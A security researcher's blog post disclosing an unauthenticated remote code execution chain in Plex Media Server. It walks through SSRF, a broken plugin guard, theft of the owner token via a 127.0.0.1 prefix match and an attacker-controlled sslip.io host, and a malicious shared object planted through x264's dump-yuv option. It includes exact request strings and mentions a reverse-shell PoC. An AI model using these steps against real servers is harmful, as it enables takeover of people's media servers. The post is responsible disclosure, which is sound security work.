---
title: Plex2Shell
url: https://zmain.info/blog/plex2shell
hostname: zmain.info
description: Unauthenticated RCE in Plex Media Server
sitename: zmain.info
date: "2026-10-16"
fingerprint: bfe49708ae0f8a9c
---
# Plex2Shell

Unauthenticated RCE in Plex Media Server

## What is Plex Media Server?

Plex Media Server (PMS) is software that people run on their home servers or cloud boxes to stream their own media (yo-hoho). It listens on port 32400 and is often exposed directly to the internet so users can stream remotely. Under the hood it's a C++ binary with a bundled Python plugin framework, a media transcoder, DLNA/UPnP support, and a companion protocol for remote controls and casting. It's a large attack surface on a single port.

## How Plex auth works

PMS classifies every incoming request based on where it came from and what credentials it carries:

- **WAN**: Request came from the internet. Almost everything requires a valid token.
- **LAN**: Request came from the local network. Some extra features open up.
- **Loopback**: Request came from 127.0.0.1. The server trusts these heavily because they should only come from itself. The `/system/agents/*` API family, which manages the plugin system, opens with no token at all on loopback.
- **Owner**: A request carrying the owner's `local-*` admin token. This gives full control of the server: reading preferences, changing settings, managing libraries, triggering transcodes.

There's also a behavior in the Python plugin framework where the server automatically attaches the owner's admin token to any outbound HTTP request whose URL starts with `http://127.0.0.1`. This is meant to authenticate the server's internal requests to itself.

## How I found it with LLMs

My approach comes down to two questions. What inputs can I send, and where do they end up?

```
Recon -> Hunt -> Verify -> Chain
```
1. **Recon**: Break the system into logical components. Map every path from user input to a dangerous sink.
2. **Hunt**: Focused vulnerability hunt per component.
3. **Verify**: Spawn a separate agent to try to disprove each finding. If it can't refute the bug, it's likely real.
4. **Chain**: Find the maximum-impact exploit chain from the primitives discovered.

Repeat steps 1 through 3 until there are diminishing returns. Generally, the more primitives you have, the more opportunity you have for chaining.

I used LLMs heavily for all 4 parts. However, this was not a matter of telling the LLM "go hack Plex". It was hours of iterative work, dead ends, and reprioritization. All of the judgment calls on what to look for and what to prioritize were mine. The LLM speeds this process up significantly, allowing me to stay at a higher level and simply guide the process.

## The Chain

[https://github.com/code-zm/plex2shell](https://github.com/code-zm/plex2shell)

```
[attacker on the internet, junk token]
        |
   (1) /player/timeline  -- SSRF -->  server POSTs to itself on
        |                              127.0.0.1
        v
   (2) /system/agents/.../searchOne  -- loopback-only plugin API,
        |   now reachable because the request came from loopback
        |   -> identifier= injection forges a call to any plugin function
        v
   (3) networking.py:149  -- the forged call targets GetResultFromNetwork
        |   with a URL like http://127.0.0.1.<attacker>.sslip.io/...
        |   the server sees "127.0.0.1" prefix, attaches the owner token,
        |   then DNS resolves the hostname to the attacker's IP
        v
   attacker now holds an OWNER admin token
        |
   (4) /video/:/transcode/universal?path=<url>  -- with the owner token,
        |   point the transcoder at an attacker-hosted carrier video
        v
   (5) TranscoderH264Options=dump-yuv  -- x264 writes the decoded frames
        |   to an attacker-chosen path in the Codecs directory; the frames
        |   are a bit-exact copy of the input, which is a shared object
        |   -> next transcode dlopens it -> constructor runs
        v
   [code executes as uid=1000(plex)]
```
## Stage 1: Unauthenticated SSRF

Plex has a "companion protocol" that lets remote controls and casting devices communicate with the server. Part of this is the `/player/*` endpoint family, which handles things like timeline updates (what's currently playing) and subscriptions (the server subscribes to a player to get status updates).

The `/player/timeline` endpoint has a token gate, but it only checks whether the `X-Plex-Token` header exists. It never checks if the value is valid. Sending `X-Plex-Token: junk` is enough to pass.

```
HttpReply CompanionProxyRequestHandler::handle(HttpRequest& req) {
    if (req.locality == Locality::WAN && !req.hasParam("X-Plex-Token")) {
        return HttpReply{401};
    }
    // hasParam() checks existence, not validity
    return CompanionProxyRequestHandler::instance().dispatch(req);
}
```
The subscription flow works like this: a player registers itself via long-poll, then the server can subscribe to it. When the server later unsubscribes, it fires a callback HTTP request to the player's URL. That callback URL is constructed from the `protocol`, `host`, and `port` parameters the player provided:

```
std::string Controller::callbackUrl() const {
    return (boost::format("%1%://%2%:%3%") % protocol % host % port).str();
}
```
The `protocol` parameter is inserted raw into the URL with no validation. If the attacker puts a full URL in `protocol`, like `http://127.0.0.1:32400/system/agents/something`, that becomes the callback destination. When the unsubscribe fires, PMS makes a POST request to that URL from its own socket, from a real `127.0.0.1` origin. The server SSRFs itself.

The attack sequence:

1. Register a player with a junk token (long-poll)
2. Subscribe, injecting the target loopback URL into `protocol`
3. Unsubscribe, which fires the callback

The resulting request is blind, meaning we don't see the response, and it is POST-only. That seems limiting at first, however it turns out not to matter.

## Stage 2: Loopback Pivot

Now we have a blind POST from loopback. The question is what we can do with it.

PMS has a plugin system. "Agents" are Python plugins that handle things like fetching metadata from TVDB, IMDB, and other sources. The server manages them through the `/system/agents/*` API, which is the one API family that opens with no token on a loopback-origin request. Since our Stage 1 SSRF gives us a genuine loopback origin, we can talk to this API.

The `searchOne` endpoint in the agent API is supposed to only work with registered agent identifiers. There's a guard in `agentservice.py` that checks if the identifier is in the plugin list:

```
@lock(self.agent_info)
def inner():
    if identifier not in Core.messaging.plugin_list():
        return  # returns from inner(), not from search_one
    # ... proceed ...
```
However, this guard is broken. The `@lock` decorator wraps `inner()` and discards its return value. When `inner()` returns early because the identifier isn't recognized, `search_one` just keeps going. The check never stops anything.

After the guard, the identifier gets spliced into an internal URL without any encoding:

```
url = 'http://127.0.0.1:32400/:/plugins/%s/messaging/%s' % (target, key)
```
Since the identifier isn't sanitized, a `?` character opens a query string and a `#` truncates the trailing `/messaging/...` path. The attacker controls the full path and query of the loopback request the server makes next.

Put together, this lets the attacker forge a request to any plugin function on loopback.

## Stage 3: Owner Token Theft

We can now call any plugin function, so we need to pick one that's useful. The bundled TheTVDB agent (which Plex ships for fetching TV show metadata) has a function called `GetResultFromNetwork`. It takes a URL and fetches it. Normally this is used internally to grab metadata from thetvdb.com.

This is where the auth behavior from earlier comes in. Whenever the plugin framework makes an outbound HTTP request, it checks if the URL starts with `http://127.0.0.1`:

```
if url.find('http://127.0.0.1') == 0:
    request.headers['X-Plex-Token'] = os.environ['PLEXTOKEN']
```
If it does, the server attaches the owner's admin token to the request. This is an unbounded string prefix match, which means `http://127.0.0.1.evil.com` also passes.

The sslip.io DNS service makes this easy to exploit. The hostname `127.0.0.1.10-0-0-9.sslip.io` starts with `127.0.0.1` (so the prefix check passes and the token gets attached) but DNS-resolves to `10.0.0.9` (the attacker's IP).

So the Stage 2 injection targets GetResultFromNetwork with a URL like:

```
com.plexapp.agents.thetvdb/function/GetResultFromNetwork?url=http://127.0.0.1.<attacker>.sslip.io:8952/leak#
```
The server makes the request, attaches the owner's `local-*` admin token in the `X-Plex-Token` header, and sends it to the attacker. The attacker's listener receives the token.

With that token, `GET /:/prefs`, `GET /accounts`, and `PUT /:/prefs` all return 200. The attacker now has full owner admin access without ever having real credentials.

## Stage 4: Payload Delivery

Now we need to turn admin access into code execution. The path goes through the transcoder.

Plex transcodes media on the fly when a client can't play the original format. The transcoder endpoint at `/video/:/transcode/universal` accepts a `path` parameter pointing to the media source, which can be an HTTP URL. The server fetches the URL, parses it as an item document (an XML file describing the media), then fetches the actual media bytes from the `<Part key="...">` URL inside. There's no host allowlist on either fetch, so we can point both at our attacker server.

The interesting part is the `TranscoderH264Options` server preference. This is a string that gets appended verbatim to the x264 encoder's command-line options on every transcode. It's writable by the owner via `PUT /:/prefs`. x264 (the H.264 encoding library Plex bundles) has a debug option called `dump-yuv` that writes decoded YUV frames to a file path of the caller's choosing via `fopen(path, "w")`.

If we set `TranscoderH264Options` to `dump-yuv=/path/to/target/file.so:qp=0`, then every transcode will write its decoded video frames to that path. The `qp=0` part makes the encoding lossless, which means the decoded frames are bit-exact copies of the input. The attacker controls every byte.

The attack:

1. Set the preference: `PUT /:/prefs?TranscoderH264Options=dump-yuv=<codec dir>/x.so:qp=0`
2. Build a carrier video: compile a constructor-only ELF shared object, pad it to fill a video frame, encode it as a lossless H.264 MP4 where frame 0's luma plane is the ELF bytes
3. Host the carrier on the attacker's HTTP server along with an item.xml pointing to it
4. Trigger a transcode: `GET /video/:/transcode/universal?path=http://attacker/item.xml`
5. The transcoder fetches the carrier, decodes it, and x264's dump-yuv writes the bit-exact ELF to the codec directory
6. Clear the preference so it doesn't persist

```
PUT /:/prefs?TranscoderH264Options=dump-yuv=/var/lib/plexmediaserver/.../Codecs/<setid>-linux-x86_64/x.so:qp=0
```
## Stage 5: Code Execution

The "Codecs" directory is where Plex stores its codec libraries. It's organized into set-directories named by a hash and platform (like `<setid>-linux-x86_64`). At transcoder startup, a function called `avpriv_load_new_libs` in Plex's bundled `libavutil.so.58` enumerates the set-directory and `dlopen(RTLD_NOW)`s every file ending in `.so`. It doesn't check for a `lib` prefix, doesn't require the execute bit, doesn't verify any signature, and doesn't look for any specific symbol.

When `dlopen` loads a shared object, it runs the ELF's `DT_INIT_ARRAY` (constructor functions) before doing any symbol resolution. A `.so` that only has a constructor and no exported symbols will still execute its code on load.

We then trigger a second transcode. The codec directory gets re-enumerated, the `.so` we wrote in Stage 4 gets loaded, and the constructor runs as `uid=1000(plex)`.

In the PoC, the constructor `fork()`s and `execve()`s a reverse shell back to the attacker.

## Disclosure Timeline

| Date | Event | 
|---|---|
| 2026-07-27 | Reported to [\[email protected\]](https://zmain.info/cdn-cgi/l/email-protection#3c4f595f494e5548457c4c50594412484a) | 
| 2026-08-04 | Plex acknowledged and paid bounty | 
| 2026-09-23 | CVEs assigned (CVE-2026-96652, -96654, -96655, -96656) | 
| 2026-10-16 | Public disclosure | 

*Reported through Plex's security program. Thanks to the Plex security team for the quick response and fixes.*
